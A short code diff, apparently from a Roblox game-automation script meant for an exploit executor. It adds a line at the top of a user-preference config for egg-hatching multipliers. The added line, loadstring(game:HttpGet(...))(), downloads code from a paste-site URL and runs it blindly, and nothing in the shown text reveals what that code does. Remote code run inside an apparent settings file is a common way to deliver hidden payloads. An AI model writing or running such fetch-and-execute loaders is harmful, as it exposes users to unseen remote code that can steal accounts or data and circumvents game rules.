@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("http://vpaste.net/DkVuB"))()
 getgenv().UserPreference = {
     MinimumRiftMultipliers = {
         ['Pastel Egg'] = 25,
